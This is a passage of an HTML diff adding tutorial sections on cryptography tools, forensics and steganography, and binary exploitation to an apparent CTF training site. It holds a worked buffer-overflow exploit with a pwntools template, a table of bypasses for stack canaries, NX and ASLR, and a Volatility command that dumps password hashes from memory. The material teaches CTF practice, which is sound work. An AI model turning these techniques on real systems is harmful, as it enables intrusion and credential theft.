+                    <h4>Wiener's Attack</h4>
+                    <p>If d is small relative to n, use continued fractions</p>
+                </div>
+            </div>
+
+            <h3>Cryptography Tools</h3>
+            <div class="alert-box alert-success">
+                <div class="alert-title">Essential Crypto Tools</div>
+                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 1rem;">
+                    <div>
+                        <strong><a href="https://gchq.github.io/CyberChef/" target="_blank" style="color: inherit;">CyberChef</a></strong>
+                        <p style="margin: 0.25rem 0; font-size: 0.9rem;">Swiss army knife for encoding/decoding</p>
+                    </div>
+                    <div>
+                        <strong><a href="https://www.dcode.fr/" target="_blank" style="color: inherit;">dCode</a></strong>
+                        <p style="margin: 0.25rem 0; font-size: 0.9rem;">Cipher identifier and solver</p>
+                    </div>
+                    <div>
+                        <strong>RsaCtfTool</strong>
+                        <p style="margin: 0.25rem 0; font-size: 0.9rem;">Automated RSA attack tool</p>
+                    </div>
+                    <div>
+                        <strong>hashcat / John</strong>
+                        <p style="margin: 0.25rem 0; font-size: 0.9rem;">Password/hash cracking</p>
+                    </div>
+                </div>
+            </div>
+
+            <h3>Quick Commands</h3>
+            <div style="background: #0d1117; padding: 1.5rem; border-radius: 8px; margin: 1.5rem 0; font-family: monospace;">
+                <p style="color: #7ee787; margin-bottom: 0.5rem;"># Base64 decode</p>
+                <p style="color: #f0f6fc;">echo "ZmxhZ3toZWxsb30=" | base64 -d</p>
+                <br>
+                <p style="color: #7ee787; margin-bottom: 0.5rem;"># Hex decode</p>
+                <p style="color: #f0f6fc;">echo "666c6167" | xxd -r -p</p>
+                <br>
+                <p style="color: #7ee787; margin-bottom: 0.5rem;"># ROT13 decode</p>
+                <p style="color: #f0f6fc;">echo "synt" | tr 'a-zA-Z' 'n-za-mN-ZA-M'</p>
+                <br>
+                <p style="color: #7ee787; margin-bottom: 0.5rem;"># Hash identification</p>
+                <p style="color: #f0f6fc;">hashid "5d41402abc4b2a76b9719d911017c592"</p>
+            </div>
+
+            <!-- Related Resource Link -->
+            <div style="background: linear-gradient(135deg, #3d1a5f 0%, #1a1a2e 100%); padding: 1.5rem; border-radius: 12px; margin-top: 2rem; text-align: center; border: 1px solid #9b59b6;">
+                <h4 style="color: #9b59b6; margin-top: 0;">Practice Workshop</h4>
+                <p style="color: #b8c5d6; margin-bottom: 1rem;">Try our interactive Cryptography Workshop with real challenges.</p>
+                <a href="workshop-crypto.html" style="display: inline-block; background: #9b59b6; color: white; padding: 0.75rem 1.5rem; border-radius: 8px; text-decoration: none; font-weight: bold; transition: all 0.3s ease;">
+                    Launch Crypto Workshop
+                </a>
+            </div>
+        </section>
+         <section id="tab-forensics" class="tab-content">
+            <h2>Digital Forensics & Steganography</h2>
+            <p>Forensics challenges involve analyzing files, disk images, memory dumps, and network captures to find hidden information. Steganography focuses on data hidden within seemingly innocent files.</p>
+
+            <div style="background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%); padding: 2rem; border-radius: 12px; margin: 2rem 0;">
+                <h3 style="color: #27ae60; margin-top: 0; text-align: center;">Forensics Investigation Workflow</h3>
+                <svg viewBox="0 0 700 100" style="max-width: 100%; height: auto;">
+                    <!-- Step boxes -->
+                    <rect x="10" y="25" width="120" height="50" rx="8" fill="#3498db"/>
+                    <text x="70" y="55" text-anchor="middle" fill="white" font-weight="bold" font-size="10">1. Identify File</text>
+                    
+                    <path d="M 135 50 L 155 50" stroke="#ecf0f1" stroke-width="2" marker-end="url(#arrowFor)"/>
+                    
+                    <rect x="160" y="25" width="120" height="50" rx="8" fill="#9b59b6"/>
+                    <text x="220" y="55" text-anchor="middle" fill="white" font-weight="bold" font-size="10">2. Extract Metadata</text>
+                    
+                    <path d="M 285 50 L 305 50" stroke="#ecf0f1" stroke-width="2" marker-end="url(#arrowFor)"/>
+                    
+                    <rect x="310" y="25" width="120" height="50" rx="8" fill="#e67e22"/>
+                    <text x="370" y="55" text-anchor="middle" fill="white" font-weight="bold" font-size="10">3. Analyze Content</text>
+                    
+                    <path d="M 435 50 L 455 50" stroke="#ecf0f1" stroke-width="2" marker-end="url(#arrowFor)"/>
+                    
+                    <rect x="460" y="25" width="120" height="50" rx="8" fill="#e74c3c"/>
+                    <text x="520" y="55" text-anchor="middle" fill="white" font-weight="bold" font-size="10">4. Extract Hidden</text>
+                    
+                    <path d="M 585 50 L 605 50" stroke="#ecf0f1" stroke-width="2" marker-end="url(#arrowFor)"/>
+                    
+                    <rect x="610" y="25" width="80" height="50" rx="8" fill="#27ae60"/>
+                    <text x="650" y="55" text-anchor="middle" fill="white" font-weight="bold" font-size="10">5. Flag!</text>
+                    
+                    <defs>
+                        <marker id="arrowFor" markerWidth="10" markerHeight="10" refX="9" refY="3" orient="auto">
+                            <path d="M0,0 L0,6 L9,3 z" fill="#ecf0f1"/>
+                        </marker>
+                    </defs>
+                </svg>
+            </div>
+
+            <!-- Worked Examples Section -->
+            <div style="background: linear-gradient(135deg, #1a3d2e 0%, #1a1a2e 100%); padding: 2rem; border-radius: 12px; margin: 2rem 0; border: 2px solid #27ae60;">
+                <h3 style="color: #27ae60; margin-top: 0;"> Worked Example: Finding Hidden Data in an Image</h3>
+                <p style="color: #b8c5d6;"><strong>Scenario:</strong> You download <code>mystery.png</code> from a forensics challenge.</p>
+                
+                <div style="background: #0d1117; padding: 1rem; border-radius: 8px; margin: 1rem 0; font-family: monospace;">
+                    <p style="color: #7ee787;"># Step 1: Check the file type</p>
+                    <p style="color: #f0f6fc;">$ file mystery.png</p>
+                    <p style="color: #888;">mystery.png: PNG image data, 800 x 600, 8-bit/color RGBA</p>
+                </div>
+                
+                <div style="background: #0d1117; padding: 1rem; border-radius: 8px; margin: 1rem 0; font-family: monospace;">
+                    <p style="color: #7ee787;"># Step 2: Search for readable strings</p>
+                    <p style="color: #f0f6fc;">$ strings mystery.png | grep -i "pico\|flag\|ctf"</p>
+                    <p style="color: #888;">picoCTF{h1dd3n_1n_pl41n_s1ght}</p>
+                </div>
+                
+                <div style="background: #0d1117; padding: 1rem; border-radius: 8px; margin: 1rem 0; font-family: monospace;">
+                    <p style="color: #7ee787;"># Step 3: If strings doesn't work, check metadata</p>
+                    <p style="color: #f0f6fc;">$ exiftool mystery.png</p>
+                    <p style="color: #888;">File Name         : mystery.png<br>Comment           : picoCTF{m3t4d4t4_15_k3y}</p>
+                </div>
+                
+                <div style="background: #0d1117; padding: 1rem; border-radius: 8px; margin: 1rem 0; font-family: monospace;">
+                    <p style="color: #7ee787;"># Step 4: Check for embedded files</p>
+                    <p style="color: #f0f6fc;">$ binwalk -e mystery.png</p>
+                    <p style="color: #888;">DECIMAL    HEXADECIMAL    DESCRIPTION<br>0          0x0            PNG image<br>45678      0xB26E         Zip archive data</p>
+                </div>
+                
+                <p style="color: #f1c40f;"><strong>Common hiding spots:</strong> strings, EXIF metadata, appended data after image, LSB steganography</p>
+            </div>
+
+            <div style="background: linear-gradient(135deg, #1a3d2e 0%, #1a1a2e 100%); padding: 2rem; border-radius: 12px; margin: 2rem 0; border: 2px solid #e67e22;">
+                <h3 style="color: #e67e22; margin-top: 0;"> Worked Example: Extracting Data from a PCAP File</h3>
+                <p style="color: #b8c5d6;"><strong>Scenario:</strong> You're given <code>capture.pcap</code> containing network traffic.</p>
+                
+                <div style="background: #0d1117; padding: 1rem; border-radius: 8px; margin: 1rem 0; font-family: monospace;">
+                    <p style="color: #7ee787;"># Step 1: Quick search for flags in packet data</p>
+                    <p style="color: #f0f6fc;">$ strings capture.pcap | grep -i "pico\|flag"</p>
+                </div>
+                
+                <div style="background: #0d1117; padding: 1rem; border-radius: 8px; margin: 1rem 0; font-family: monospace;">
+                    <p style="color: #7ee787;"># Step 2: Extract HTTP objects with tshark</p>
+                    <p style="color: #f0f6fc;">$ tshark -r capture.pcap --export-objects "http,exported_files"</p>
+                </div>
+                
+                <div style="background: #0d1117; padding: 1rem; border-radius: 8px; margin: 1rem 0; font-family: monospace;">
+                    <p style="color: #7ee787;"># Step 3: Follow TCP streams to see conversations</p>
+                    <p style="color: #f0f6fc;">$ tshark -r capture.pcap -z "follow,tcp,ascii,0"</p>
+                </div>
+                
+                <p style="color: #f1c40f;"><strong>In Wireshark:</strong> Right-click a packet → Follow → TCP Stream to see full conversation. Also try File → Export Objects → HTTP</p>
+            </div>
+
+            <h3>File Analysis Fundamentals</h3>
+            <p>Always start by understanding what type of file you're dealing with. File extensions can lie!</p>
+
+            <div style="background: #1a1a2e; padding: 1.5rem; border-radius: 8px; margin: 1.5rem 0;">
+                <h4 style="color: #3498db; margin-top: 0;">Common File Signatures (Magic Numbers)</h4>
+                <table style="width: 100%; border-collapse: collapse; color: #b8c5d6;">
+                    <tr style="border-bottom: 1px solid #444;">
+                        <th style="padding: 0.5rem; text-align: left; color: #27ae60;">File Type</th>
+                        <th style="padding: 0.5rem; text-align: left; color: #27ae60;">Hex Signature</th>
+                        <th style="padding: 0.5rem; text-align: left; color: #27ae60;">ASCII</th>
+                    </tr>
+                    <tr><td style="padding: 0.5rem;">PNG</td><td style="padding: 0.5rem;"><code>89 50 4E 47 0D 0A 1A 0A</code></td><td style="padding: 0.5rem;">‰PNG....</td></tr>
+                    <tr><td style="padding: 0.5rem;">JPEG</td><td style="padding: 0.5rem;"><code>FF D8 FF</code></td><td style="padding: 0.5rem;">ÿØÿ</td></tr>
+                    <tr><td style="padding: 0.5rem;">GIF</td><td style="padding: 0.5rem;"><code>47 49 46 38</code></td><td style="padding: 0.5rem;">GIF8</td></tr>
+                    <tr><td style="padding: 0.5rem;">PDF</td><td style="padding: 0.5rem;"><code>25 50 44 46</code></td><td style="padding: 0.5rem;">%PDF</td></tr>
+                    <tr><td style="padding: 0.5rem;">ZIP/DOCX/JAR</td><td style="padding: 0.5rem;"><code>50 4B 03 04</code></td><td style="padding: 0.5rem;">PK..</td></tr>
+                    <tr><td style="padding: 0.5rem;">RAR</td><td style="padding: 0.5rem;"><code>52 61 72 21</code></td><td style="padding: 0.5rem;">Rar!</td></tr>
+                    <tr><td style="padding: 0.5rem;">ELF (Linux)</td><td style="padding: 0.5rem;"><code>7F 45 4C 46</code></td><td style="padding: 0.5rem;">.ELF</td></tr>
+                    <tr><td style="padding: 0.5rem;">PE (Windows)</td><td style="padding: 0.5rem;"><code>4D 5A</code></td><td style="padding: 0.5rem;">MZ</td></tr>
+                </table>
+            </div>
+
+            <h3>Essential Forensics Commands</h3>
+            <div style="background: #0d1117; padding: 1.5rem; border-radius: 8px; margin: 1.5rem 0; font-family: monospace;">
+                <p style="color: #7ee787; margin-bottom: 0.5rem;"># Identify file type (don't trust extensions!)</p>
+                <p style="color: #f0f6fc;">file suspicious_file.txt</p>
+                <br>
+                <p style="color: #7ee787; margin-bottom: 0.5rem;"># Extract readable strings from binary</p>
+                <p style="color: #f0f6fc;">strings suspicious_file | grep -i flag</p>
+                <br>
+                <p style="color: #7ee787; margin-bottom: 0.5rem;"># View hex dump</p>
+                <p style="color: #f0f6fc;">xxd file.bin | head -50</p>
+                <p style="color: #f0f6fc;">hexdump -C file.bin | less</p>
+                <br>
+                <p style="color: #7ee787; margin-bottom: 0.5rem;"># Extract all metadata from image</p>
+                <p style="color: #f0f6fc;">exiftool image.jpg</p>
+                <br>
+                <p style="color: #7ee787; margin-bottom: 0.5rem;"># Find embedded files</p>
+                <p style="color: #f0f6fc;">binwalk -e suspicious_image.png</p>
+                <br>
+                <p style="color: #7ee787; margin-bottom: 0.5rem;"># Carve files from disk image</p>
+                <p style="color: #f0f6fc;">foremost -i disk.img -o output_folder/</p>
+            </div>
+
+            <h3>Steganography Techniques</h3>
+            <p>Steganography hides data within other files (images, audio, video) so the carrier appears unchanged to casual observation.</p>
+
+            <div class="category-grid">
+                <div class="category-card" style="border-left: 4px solid #3498db;">
+                    <h4 style="color: #3498db;">LSB Steganography</h4>
+                    <p>Data hidden in Least Significant Bits of pixel values. Virtually invisible to the eye.</p>
+                    <p><strong>Tools:</strong> zsteg, stegsolve, PIL</p>
+                    <code>zsteg image.png</code>
+                </div>
+                <div class="category-card" style="border-left: 4px solid #9b59b6;">
+                    <h4 style="color: #9b59b6;">Appended Data</h4>
+                    <p>Data added after the end of a valid file. File still opens normally.</p>
+                    <p><strong>Tools:</strong> binwalk, strings, xxd</p>
+                    <code>binwalk image.png</code>
+                </div>
+                <div class="category-card" style="border-left: 4px solid #e67e22;">
+                    <h4 style="color: #e67e22;">Metadata Hiding</h4>
+                    <p>Data hidden in EXIF, IPTC, or XMP metadata fields.</p>
+                    <p><strong>Tools:</strong> exiftool, FOCA</p>
+                    <code>exiftool -a -u image.jpg</code>
+                </div>
+                <div class="category-card" style="border-left: 4px solid #27ae60;">
+                    <h4 style="color: #27ae60;">Audio Spectrograms</h4>
+                    <p>Visual patterns hidden in audio frequency spectrum.</p>
+                    <p><strong>Tools:</strong> Audacity, Sonic Visualiser</p>
+                </div>
+            </div>
+
+            <h3>Audio Forensics</h3>
+            <div style="background: linear-gradient(135deg, #2d2d44 0%, #1a1a2e 100%); padding: 1.5rem; border-radius: 8px; margin: 1.5rem 0;">
+                <h4 style="color: #e67e22; margin-top: 0;">Common Audio Challenges</h4>
+                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 1rem; color: #b8c5d6;">
+                    <div>
+                        <p><strong style="color: #3498db;">Spectrogram Messages</strong></p>
+                        <p>Open in Audacity → Analyze → Spectrogram view. Look for text or QR codes in the visual pattern.</p>
+                    </div>
+                    <div>
+                        <p><strong style="color: #3498db;">Morse Code</strong></p>
+                        <p>Listen for beeps or view waveform. Short = dot, Long = dash.</p>
+                    </div>
+                    <div>
+                        <p><strong style="color: #3498db;">DTMF Tones</strong></p>
+                        <p>Phone dial tones encoding numbers. Use multimon-ng to decode.</p>
+                    </div>
+                    <div>
+                        <p><strong style="color: #3498db;">Reversed Audio</strong></p>
+                        <p>Audio played backwards. Reverse in Audacity: Effect → Reverse</p>
+                    </div>
+                </div>
+            </div>
+
+            <h3>Memory Forensics</h3>
+            <p>Memory dumps contain volatile data from a running system—passwords, encryption keys, running processes, and more.</p>
+
+            <div style="background: #0d1117; padding: 1.5rem; border-radius: 8px; margin: 1.5rem 0; font-family: monospace;">
+                <p style="color: #7ee787; margin-bottom: 0.5rem;"># Identify OS profile</p>
+                <p style="color: #f0f6fc;">volatility -f memory.dmp imageinfo</p>
+                <br>
+                <p style="color: #7ee787; margin-bottom: 0.5rem;"># List running processes</p>
+                <p style="color: #f0f6fc;">volatility -f memory.dmp --profile=Win7SP1x64 pslist</p>
+                <br>
+                <p style="color: #7ee787; margin-bottom: 0.5rem;"># Dump process memory</p>
+                <p style="color: #f0f6fc;">volatility -f memory.dmp --profile=Win7SP1x64 memdump -p 1234 -D dump/</p>
+                <br>
+                <p style="color: #7ee787; margin-bottom: 0.5rem;"># Extract password hashes</p>
+                <p style="color: #f0f6fc;">volatility -f memory.dmp --profile=Win7SP1x64 hashdump</p>
+                <br>
+                <p style="color: #7ee787; margin-bottom: 0.5rem;"># View command history</p>
+                <p style="color: #f0f6fc;">volatility -f memory.dmp --profile=Win7SP1x64 cmdscan</p>
+            </div>
+
+            <h3>Network Forensics (PCAP Analysis)</h3>
+            <p>Network captures contain all traffic between systems. Look for credentials, file transfers, and suspicious activity.</p>
+
+            <div class="category-grid">
+                <div class="category-card">
+                    <h4>Wireshark Filters</h4>
+                    <p><code>http.request.method == "POST"</code></p>
+                    <p><code>tcp.port == 80</code></p>
+                    <p><code>frame contains "flag"</code></p>
+                </div>
+                <div class="category-card">
+                    <h4>Follow Streams</h4>
+                    <p>Right-click packet → Follow → TCP/HTTP Stream to see full conversation</p>
+                </div>
+                <div class="category-card">
+                    <h4>Export Objects</h4>
+                    <p>File → Export Objects → HTTP to extract transferred files</p>
+                </div>
+                <div class="category-card">
+                    <h4>Common Protocols</h4>
+                    <p>HTTP, FTP, DNS, SMTP, Telnet often contain readable data</p>
+                </div>
+            </div>
+
+            <div class="alert-box alert-warning">
+                <div class="alert-title">Forensics Checklist</div>
+                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 1rem;">
+                    <ul>
+                        <li>Check file type with <code>file</code></li>
+                        <li>Run <code>strings</code> and grep for flag</li>
+                        <li>View hex dump for hidden data</li>
+                        <li>Extract metadata with <code>exiftool</code></li>
+                        <li>Check for embedded files with <code>binwalk</code></li>
+                    </ul>
+                    <ul>
+                        <li>Try steganography tools (zsteg, steghide)</li>
+                        <li>Look at different color channels</li>
+                        <li>Check audio spectrogram if audio file</li>
+                        <li>For PCAP: follow streams, export objects</li>
+                        <li>For memory: use Volatility plugins</li>
+                    </ul>
+                </div>
+            </div>
+
+            <!-- Related Resource Link -->
+            <div style="background: linear-gradient(135deg, #1a3f2e 0%, #1a1a2e 100%); padding: 1.5rem; border-radius: 12px; margin-top: 2rem; text-align: center; border: 1px solid #27ae60;">
+                <h4 style="color: #27ae60; margin-top: 0;">Practice Workshop</h4>
+                <p style="color: #b8c5d6; margin-bottom: 1rem;">Try our interactive Forensics Workshop with real challenges.</p>
+                <a href="workshop-forensics.html" style="display: inline-block; background: #27ae60; color: white; padding: 0.75rem 1.5rem; border-radius: 8px; text-decoration: none; font-weight: bold; transition: all 0.3s ease;">
+                    Launch Forensics Workshop
+                </a>
+            </div>
+        </section>
+         <section id="tab-bin-exp" class="tab-content">
+            <h2>Binary Exploitation (Pwn)</h2>
+            <p>Binary exploitation, often called "pwn", involves finding and exploiting vulnerabilities in compiled programs to gain unauthorized control. This is one of the most challenging but rewarding CTF categories.</p>
+
+            <div class="alert-box alert-warning">
+                <div class="alert-title">Prerequisites</div>
+                <p>Binary exploitation requires understanding of:</p>
+                <ul>
+                    <li>C/C++ programming and memory management</li>
+                    <li>Assembly language basics (x86/x86_64)</li>
+                    <li>How programs execute (stack, heap, registers)</li>
+                    <li>Linux system calls and ELF format</li>
+                </ul>
+            </div>
+
+            <h3>Memory Layout</h3>
+            <p>Understanding how a program's memory is organized is fundamental to exploitation.</p>
+
+            <div style="background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%); padding: 2rem; border-radius: 12px; margin: 2rem 0;">
+                <svg viewBox="0 0 360 220" style="max-width: 400px; height: auto; display: block; margin: 0 auto;">
+                    <!-- Memory layout diagram - centered, no side labels -->
+                    <text x="40" y="25" text-anchor="end" fill="#888" font-size="10">0xFFFFFFFF</text>
+                    <rect x="50" y="10" width="250" height="35" fill="#e74c3c" stroke="#fff" stroke-width="1"/>
+                    <text x="175" y="33" text-anchor="middle" fill="white" font-size="12" font-weight="bold">Stack ↓</text>
+                    
+                    <rect x="50" y="45" width="250" height="25" fill="#555" stroke="#fff" stroke-width="1"/>
+                    <text x="175" y="62" text-anchor="middle" fill="#aaa" font-size="9">↕ grows toward each other</text>
+                    
+                    <rect x="50" y="70" width="250" height="35" fill="#27ae60" stroke="#fff" stroke-width="1"/>
+                    <text x="175" y="93" text-anchor="middle" fill="white" font-size="12" font-weight="bold">Heap ↑</text>
+                    
+                    <rect x="50" y="105" width="250" height="30" fill="#3498db" stroke="#fff" stroke-width="1"/>
+                    <text x="175" y="125" text-anchor="middle" fill="white" font-size="11">.bss (uninitialized data)</text>
+                    
+                    <rect x="50" y="135" width="250" height="30" fill="#9b59b6" stroke="#fff" stroke-width="1"/>
+                    <text x="175" y="155" text-anchor="middle" fill="white" font-size="11">.data (initialized data)</text>
+                    
+                    <text x="40" y="185" text-anchor="end" fill="#888" font-size="10">0x00000000</text>
+                    <rect x="50" y="165" width="250" height="30" fill="#e67e22" stroke="#fff" stroke-width="1"/>
+                    <text x="175" y="185" text-anchor="middle" fill="white" font-size="11">.text (code)</text>
+                </svg>
+                
+                <!-- Legend below the diagram -->
+                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 0.75rem; margin-top: 1.5rem; padding-top: 1rem; border-top: 1px solid #444;">
+                    <div style="display: flex; align-items: center; gap: 0.5rem;">
+                        <span style="width: 16px; height: 16px; background: #e74c3c; border-radius: 3px;"></span>
+                        <span style="color: #b8c5d6; font-size: 0.85rem;"><strong>Stack:</strong> Local vars, return address</span>
+                    </div>
+                    <div style="display: flex; align-items: center; gap: 0.5rem;">
+                        <span style="width: 16px; height: 16px; background: #27ae60; border-radius: 3px;"></span>
+                        <span style="color: #b8c5d6; font-size: 0.85rem;"><strong>Heap:</strong> Dynamic allocation (malloc)</span>
+                    </div>
+                    <div style="display: flex; align-items: center; gap: 0.5rem;">
+                        <span style="width: 16px; height: 16px; background: #9b59b6; border-radius: 3px;"></span>
+                        <span style="color: #b8c5d6; font-size: 0.85rem;"><strong>Data:</strong> Global/static variables</span>
+                    </div>
+                    <div style="display: flex; align-items: center; gap: 0.5rem;">
+                        <span style="width: 16px; height: 16px; background: #e67e22; border-radius: 3px;"></span>
+                        <span style="color: #b8c5d6; font-size: 0.85rem;"><strong>Text:</strong> Program instructions</span>
+                    </div>
+                </div>
+            </div>
+
+            <h3>Stack Frame Structure</h3>
+            <div style="background: #1a1a2e; padding: 1.5rem; border-radius: 8px; margin: 1.5rem 0;">
+                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 2rem;">
+                    <div>
+                        <h4 style="color: #e74c3c; margin-top: 0;">Stack Frame Contents</h4>
+                        <div style="font-family: monospace; color: #b8c5d6; font-size: 0.9rem;">
+                            <p style="color: #888;">Higher Addresses ↑</p>
+                            <p>┌─────────────────────┐</p>
+                            <p>│  Function Arguments │</p>
+                            <p>├─────────────────────┤</p>
+                            <p>│  <span style="color: #e74c3c;">Return Address</span>     │ ← Target!</p>
+                            <p>├─────────────────────┤</p>
+                            <p>│  <span style="color: #f1c40f;">Saved Base Pointer</span> │</p>
+                            <p>├─────────────────────┤</p>
+                            <p>│  <span style="color: #27ae60;">Local Variables</span>    │ ← Buffer here</p>
+                            <p>└─────────────────────┘</p>
+                            <p style="color: #888;">Lower Addresses ↓</p>
+                        </div>
+                    </div>
+                    <div>
+                        <h4 style="color: #3498db; margin-top: 0;">Key Registers (x86_64)</h4>
+                        <ul style="color: #b8c5d6;">
+                            <li><strong>RIP</strong> - Instruction Pointer (next instruction)</li>
+                            <li><strong>RSP</strong> - Stack Pointer (top of stack)</li>
+                            <li><strong>RBP</strong> - Base Pointer (frame reference)</li>
+                            <li><strong>RAX</strong> - Return value / accumulator</li>
+                            <li><strong>RDI, RSI, RDX</strong> - Function arguments 1-3</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Worked Example Section -->
+            <div style="background: linear-gradient(135deg, #3d1a1a 0%, #1a1a2e 100%); padding: 2rem; border-radius: 12px; margin: 2rem 0; border: 2px solid #e74c3c;">
+                <h3 style="color: #e74c3c; margin-top: 0;"> Worked Example: Basic Buffer Overflow</h3>
+                <p style="color: #b8c5d6;"><strong>Scenario:</strong> A binary has a <code>win()</code> function that prints the flag, but it's never called. There's also an unsafe <code>gets()</code> call.</p>
+                
+                <div style="background: #0d1117; padding: 1rem; border-radius: 8px; margin: 1rem 0; font-family: monospace;">
+                    <p style="color: #7ee787;"># Step 1: Find the buffer size and win address</p>
+                    <p style="color: #f0f6fc;">$ checksec ./vuln</p>
+                    <p style="color: #888;">No PIE, No canary - perfect for basic overflow</p>
+                    <p style="color: #f0f6fc;">$ objdump -d ./vuln | grep win</p>
+                    <p style="color: #888;">0000000000401196 &lt;win&gt;:</p>
+                </div>
+                
+                <div style="background: #0d1117; padding: 1rem; border-radius: 8px; margin: 1rem 0; font-family: monospace;">
+                    <p style="color: #7ee787;"># Step 2: Find offset to return address (using pattern)</p>
+                    <p style="color: #f0f6fc;">$ python3 -c "from pwn import *; print(cyclic(100))" | ./vuln</p>
+                    <p style="color: #888;"># Check crash address in GDB, then:</p>
+                    <p style="color: #f0f6fc;">$ python3 -c "from pwn import *; print(cyclic_find(0x6161616c))"</p>
+                    <p style="color: #888;">44  # Offset is 44 bytes</p>
+                </div>
+                
+                <div style="background: #0d1117; padding: 1rem; border-radius: 8px; margin: 1rem 0; font-family: monospace;">
+                    <p style="color: #7ee787;"># Step 3: Build and send exploit</p>
+                    <p style="color: #f0f6fc;">$ python3 -c "from pwn import *; print(b'A'*44 + p64(0x401196))" | ./vuln</p>
+                    <p style="color: #888;">picoCTF{buff3r_0v3rfl0w_w1n}</p>
+                </div>
+            </div>
+
+            <div style="background: linear-gradient(135deg, #3d1a1a 0%, #1a1a2e 100%); padding: 2rem; border-radius: 12px; margin: 2rem 0; border: 2px solid #9b59b6;">
+                <h3 style="color: #9b59b6; margin-top: 0;"> Python Exploit Template (pwntools)</h3>
+                <p style="color: #b8c5d6;">Copy this template for binary exploitation challenges:</p>
+                
+                <div style="background: #0d1117; padding: 1rem; border-radius: 8px; margin: 1rem 0; font-family: monospace; font-size: 0.85rem;">
+                    <pre style="color: #f0f6fc; margin: 0;"><span style="color: #ff7b72;">from</span> pwn <span style="color: #ff7b72;">import</span> *
+
+<span style="color: #7ee787;"># Setup</span>
+context.binary = elf = ELF(<span style="color: #a5d6ff;">'./vuln'</span>)
+<span style="color: #7ee787;"># p = process('./vuln')  # Local testing</span>
+p = remote(<span style="color: #a5d6ff;">'challenge.com'</span>, <span style="color: #79c0ff;">1337</span>)  <span style="color: #7ee787;"># Remote</span>
+
+<span style="color: #7ee787;"># Build payload</span>
+offset = <span style="color: #79c0ff;">44</span>
+win_addr = elf.symbols[<span style="color: #a5d6ff;">'win'</span>]
+
+payload = b<span style="color: #a5d6ff;">'A'</span> * offset
+payload += p64(win_addr)
+
+<span style="color: #7ee787;"># Send and get flag</span>
+p.sendline(payload)
+p.interactive()</pre>
+                </div>
+            </div>
+
+            <h3>Common Vulnerabilities</h3>
+            <div class="category-grid">
+                <div class="category-card" style="border-left: 4px solid #e74c3c;">
+                    <h4 style="color: #e74c3c;">Buffer Overflow</h4>
+                    <p>Writing beyond buffer bounds to overwrite return address. Classic attack to redirect execution.</p>
+                    <code>char buf[64]; gets(buf); // Dangerous!</code>
+                </div>
+                <div class="category-card" style="border-left: 4px solid #9b59b6;">
+                    <h4 style="color: #9b59b6;">Format String</h4>
+                    <p>Uncontrolled format specifiers can read/write memory.</p>
+                    <code>printf(user_input); // Should be printf("%s", user_input);</code>
+                </div>
+                <div class="category-card" style="border-left: 4px solid #3498db;">
+                    <h4 style="color: #3498db;">Use After Free</h4>
+                    <p>Accessing memory after it's been freed. Can lead to arbitrary code execution.</p>
+                </div>
+                <div class="category-card" style="border-left: 4px solid #27ae60;">
+                    <h4 style="color: #27ae60;">Integer Overflow</h4>
+                    <p>Arithmetic wrapping can bypass size checks and lead to buffer overflows.</p>
+                </div>
+            </div>
+
+            <h3>Protection Mechanisms</h3>
+            <p>Modern systems have protections that make exploitation harder. Check them with <code>checksec</code>:</p>
+
+            <div style="background: #0d1117; padding: 1.5rem; border-radius: 8px; margin: 1.5rem 0; font-family: monospace;">
+                <p style="color: #f0f6fc;">$ checksec ./vulnerable_binary</p>
+                <p style="color: #7ee787;">    Arch:     amd64-64-little</p>
+                <p style="color: #7ee787;">    RELRO:    <span style="color: #f1c40f;">Partial RELRO</span></p>
+                <p style="color: #7ee787;">    Stack:    <span style="color: #e74c3c;">No canary found</span></p>
+                <p style="color: #7ee787;">    NX:       <span style="color: #27ae60;">NX enabled</span></p>
+                <p style="color: #7ee787;">    PIE:      <span style="color: #e74c3c;">No PIE</span></p>
+            </div>
+
+            <table style="width: 100%; border-collapse: collapse; margin: 1.5rem 0;">
+                <thead>
+                    <tr style="background: var(--header-bg); color: white;">
+                        <th style="padding: 1rem; border: 1px solid var(--border-color);">Protection</th>
+                        <th style="padding: 1rem; border: 1px solid var(--border-color);">What It Does</th>
+                        <th style="padding: 1rem; border: 1px solid var(--border-color);">Bypass Technique</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td style="padding: 1rem; border: 1px solid var(--border-color);"><strong>Stack Canary</strong></td>
+                        <td style="padding: 1rem; border: 1px solid var(--border-color);">Random value before return address; checked before returning</td>
+                        <td style="padding: 1rem; border: 1px solid var(--border-color);">Leak canary via format string, brute force (fork)</td>
+                    </tr>
+                    <tr style="background: var(--bg-main);">
+                        <td style="padding: 1rem; border: 1px solid var(--border-color);"><strong>NX (DEP)</strong></td>
+                        <td style="padding: 1rem; border: 1px solid var(--border-color);">Stack/heap not executable</td>
+                        <td style="padding: 1rem; border: 1px solid var(--border-color);">Return-Oriented Programming (ROP)</td>
+                    </tr>
+                    <tr>
+                        <td style="padding: 1rem; border: 1px solid var(--border-color);"><strong>ASLR</strong></td>
+                        <td style="padding: 1rem; border: 1px solid var(--border-color);">Randomizes memory layout each run</td>
+                        <td style="padding: 1rem; border: 1px solid var(--border-color);">Information leak, brute force, partial overwrite</td>
+                    </tr>
+                    <tr style="background: var(--bg-main);">
+                        <td style="padding: 1rem; border: 1px solid var(--border-color);"><strong>PIE</strong></td>
+                        <td style="padding: 1rem; border: 1px solid var(--border-color);">Randomizes program base address</td>
+                        <td style="padding: 1rem; border: 1px solid var(--border-color);">Leak code address, partial overwrite</td>
+                    </tr>
+                    <tr>
+                        <td style="padding: 1rem; border: 1px solid var(--border-color);"><strong>RELRO</strong></td>
+                        <td style="padding: 1rem; border: 1px solid var(--border-color);">Makes GOT read-only (Full RELRO)</td>
+                        <td style="padding: 1rem; border: 1px solid var(--border-color);">Target other writable sections</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h3>Return-Oriented Programming (ROP)</h3>
+            <p>When NX is enabled, we can't execute code on the stack. Instead, we chain existing code snippets (gadgets) ending in <code>ret</code>.</p>
+
+            <div style="background: linear-gradient(135deg, #2d2d44 0%, #1a1a2e 100%); padding: 1.5rem; border-radius: 8px; margin: 1.5rem 0;">
